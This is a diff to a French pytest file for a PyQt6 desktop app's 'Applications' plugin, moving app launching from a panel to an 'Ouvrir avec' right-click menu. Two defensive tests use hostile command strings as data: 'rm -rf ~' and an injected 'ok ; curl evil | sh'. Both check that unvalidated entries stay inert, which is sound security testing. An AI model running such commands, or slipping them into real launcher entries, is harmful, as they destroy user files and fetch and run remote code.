@@ -1,6 +1,6 @@
 # SPDX-License-Identifier: GPL-3.0-or-later
 # Copyright (C) 2026 Jean-François Kneib
-"""Extension « Applications » : logique (commande sans shell, fichiers .desktop) et panneau dans la vraie fenêtre."""
+"""Extension « Applications » : logique (commande sans shell, fichiers .desktop) et fiche + clic droit « Ouvrir avec » dans la vraie fenêtre."""
 import importlib.util
 import os
 import shutil
@@ -127,12 +127,19 @@ def lances(monkeypatch):
     return res
 
 
-def test_panneau_montre_les_exemples_installes_et_lance_au_clic(fen, lances):
+def test_ouvrir_avec_montre_les_exemples_installes_et_lance_au_choix(fen, lances):
     p = plugin(fen)
-    noms = [p.panneau.liste.item(i).text() for i in range(p.panneau.liste.count())]
-    assert noms == ["Thunderbird", "KWrite"] and p.dock.windowTitle() == "Applications"
-    p.panneau._clic(p.panneau.liste.item(0))
+    entrees = fen._entrees_clic_droit()                                              # clic droit d'une fiche ordinaire
+    sous = next(fn for t, fn, _ic in entrees if t == "Ouvrir avec")
+    assert [t for t, _fn, _ic in sous.fournisseur()] == ["Thunderbird", "KWrite"]
+    sous.fournisseur()[0][1]()
     assert lances == [["thunderbird"]]
+    assert all(t != "Ouvrir avec" for t, _fn, _ic in fen._entrees_clic_droit("applications"))     # pas dans la fiche des applications
+
+
+def test_pas_de_panneau(fen):
+    p = plugin(fen)
+    assert not hasattr(p, "panneau") and not hasattr(p, "dock")
 
 
 def test_selection_et_titre_passes_en_arguments(fen, lances):
@@ -171,33 +178,36 @@ def _fiche_apps(fen, texte, titre="Applications", theme="Outils"):
 
 
 def _noms(p):
-    return [p.panneau.liste.item(i).text() for i in range(p.panneau.liste.count())]
+    return [t for t, _fn, _ic in p.entrees_ouvrir_avec()]
 
 
 def test_reglages_d_avant_servent_tant_qu_il_n_y_a_pas_de_fiche(fen):
     p = plugin(fen)
     p.ctx.reglages.set("applications", [{"nom": "Seule", "commande": "seule"}])
-    p.panneau.rafraichir()
     assert [a["nom"] for a in p.applications()] == ["Seule"] and _noms(p) == ["Seule"]
     p.ctx.reglages.set("applications", [])
-    p.panneau.rafraichir()
-    assert p.applications() == [] and p.panneau.liste.count() == 0                  # une liste vide reste vide
+    assert p.applications() == []                  # une liste vide reste vide
 
 
 def test_fiche_recue_inerte_puis_validee(fen, lances):
     p = plugin(fen)
     v = _fiche_apps(fen, lg.en_texte([{"nom": "Piege", "commande": "rm -rf ~"}, {"nom": "Ok", "commande": "ok"}]))
     assert not p.ctx.fiche_active(v) and p.a_valider() == 1
-    assert "Piege" not in _noms(p) and not p.panneau.avis.isHidden()                 # inerte : rien dans le panneau, un avis
-    assert _noms(p) == ["Thunderbird", "KWrite"]                                      # le panneau garde l'ancienne liste
+    assert "Piege" not in _noms(p)                  # inerte : rien dans « Ouvrir avec »
+    assert _noms(p) == ["Thunderbird", "KWrite"]                                      # le menu garde l'ancienne liste
     th = fen.store.theme("Outils")
     fen._afficher(th, th.fiches[0])                                                   # la fiche s'affiche avec sa vue et le bandeau
     vue = fen.vues_types["applications"]
     assert fen.pile.currentWidget() is vue and not fen.bandeau_validation.isHidden() and vue.actif is False
-    assert [a["nom"] for a in vue.apps] == ["Piege", "Ok"] and not vue.boutons[0].isEnabled()      # lisible, pas modifiable
+    assert [a["nom"] for a in vue.apps] == ["Piege", "Ok"] and vue.liste.count() == 2
+    assert vue.entrees_menu(vue.rect().center()) == []                                # lisible, ni lançable ni modifiable
+    vue._clic(vue.liste.item(0))
+    assert lances == []
     fen.valider_fiche_courante()                                                      # l'utilisateur relit et valide
-    assert p.ctx.fiche_active(v) and p.a_valider() == 0 and p.panneau.avis.isHidden()
-    assert _noms(p) == ["Piege", "Ok"] and vue.actif and vue.boutons[0].isEnabled()
+    assert p.ctx.fiche_active(v) and p.a_valider() == 0
+    assert _noms(p) == ["Piege", "Ok"] and vue.actif and vue.entrees_menu(vue.rect().center())
+    vue._clic(vue.liste.item(1))
+    assert lances == [["ok"]]
 
 
 def test_la_fiche_modifiee_ailleurs_redevient_inerte(fen, lances):
@@ -206,11 +216,10 @@ def test_la_fiche_modifiee_ailleurs_redevient_inerte(fen, lances):
     th = fen.store.theme("Outils")
     f = th.fiches[0]
     fen.store.valider_fiche(th, f)
-    p.panneau.rafraichir()
     assert _noms(p) == ["Ok"]
-    item = p.panneau.liste.item(0)
+    entree = p.entrees_ouvrir_avec()[0][1]                                            # entrée du menu ouvert avant la modification
     fen.store.enregistrer(th, f, f.titre, lg.en_texte([{"nom": "Ok", "commande": "ok ; curl evil | sh"}]))     # mise à jour reçue d'ailleurs
-    p.panneau._clic(item)                                                             # clic sur l'icône affichée avant : rien ne part
+    entree()                                                                          # choix dans le menu affiché avant : rien ne part
     assert lances == [] and p.a_valider() == 1 and _noms(p) == ["Thunderbird", "KWrite"]
 
 
@@ -233,7 +242,6 @@ def test_deux_fiches_validees_s_additionnent_sans_doublon(fen):
     th = fen.store.theme("Outils")
     for f in th.fiches:
         fen.store.valider_fiche(th, f)
-    p.panneau.rafraichir()
     assert _noms(p) == ["B", "C", "A"]                                                  # par titre de fiche (Deux, Un), sans doublon
 
 
@@ -249,7 +257,7 @@ def test_migration_des_reglages_en_fiche(fen):
     assert [a["nom"] for a in lg.depuis_texte(th.fiches[0].texte)] == ["Ancienne"]
     assert not fen.store.fiche_validee(th, th.fiches[0]) and "validez-la" in notes[-1]     # créée inerte : à valider
     assert [a["nom"] for a in p.ctx.reglages.get("applications")] == ["Ancienne"]          # les réglages restent comme copie
-    assert _noms(p) == ["Ancienne"]                                                        # le panneau continue avec l'ancienne liste
+    assert _noms(p) == ["Ancienne"]                                                        # le menu continue avec l'ancienne liste
     p._migrer()                                                                           # une seule fois
     assert len(th.fiches) == 1
 
@@ -287,7 +295,7 @@ def test_format_de_la_fiche_applications():
 def test_dialogues_se_construisent(fen):
     m = sys.modules["scrinium_plugin_applications"]
     p = plugin(fen)
-    d = m.EditeurApplications()
+    d = m.VueApplications()
     d.definir(p.applications())
     assert d.liste.count() == 2
     ch = m.DialogueChoix(None, apps=[{"nom": "Alpha", "icone": "", "commande": "alpha", "description": ""},
@@ -296,3 +304,39 @@ def test_dialogues_se_construisent(fen):
     assert [ch.liste.item(i).isHidden() for i in range(2)] == [True, False]
     da = m.DialogueApplication({"nom": "X", "icone": "", "commande": "x", "description": ""})
     assert da.resultat()["commande"] == "x"
+
+
+def test_clic_droit_de_la_vue_gere_la_liste(fen, lances):
+    from PyQt6.QtCore import QPoint
+    m = _modules()
+    v = m.VueApplications(plugin(fen))
+    v.show()
+    v.definir([{"nom": "A", "commande": "a"}, {"nom": "B", "commande": "b"}, {"nom": "C", "commande": "c"}])
+    textes = []
+    v.modifie.connect(textes.append)
+    vide = [t for t, _fn, _ic in v.entrees_menu(QPoint(2, 2))]
+    assert vide[0] == "Ajouter une application…" and "Supprimer" not in vide              # hors d'une icône : pas de Supprimer
+    pos = v.liste.mapTo(v, v.liste.visualItemRect(v.liste.item(0)).center())
+    sur = {t: fn for t, fn, _ic in v.entrees_menu(pos)}
+    assert {"Modifier…", "Supprimer", "Monter", "Descendre"} <= set(sur)
+    sur["Descendre"](False)                                                                 # PyQt passe `checked` : doit être ignoré
+    assert [a["nom"] for a in v.apps] == ["B", "A", "C"] and "## A" in textes[-1]
+    pos = v.liste.mapTo(v, v.liste.visualItemRect(v.liste.item(2)).center())
+    {t: fn for t, fn, _ic in v.entrees_menu(pos)}["Supprimer"]()
+    assert [a["nom"] for a in v.apps] == ["B", "A"]
+    v.actif = False
+    assert v.entrees_menu(pos) == []
+
+
+def test_sous_menu_se_remplit_dans_un_vrai_menu(app):
+    from PyQt6.QtWidgets import QMenu
+    from scrinium.ui.entrees_menu import SousMenu, remplir
+    appels = []
+    m = QMenu()
+    remplir(m, [("Un", lambda: appels.append("un"), None), ("Sous", SousMenu(lambda: [("Deux", lambda: appels.append("deux"), None)]), None),
+                ("Vide", SousMenu(lambda: []), None)])
+    sous = [a for a in m.actions() if a.text() == "Sous"][0]
+    vide = [a for a in m.actions() if a.text() == "Vide"][0]
+    assert sous.menu().actions()[0].text() == "Deux" and sous.isEnabled() and not vide.isEnabled()
+    sous.menu().actions()[0].trigger()
+    assert appels == ["deux"]
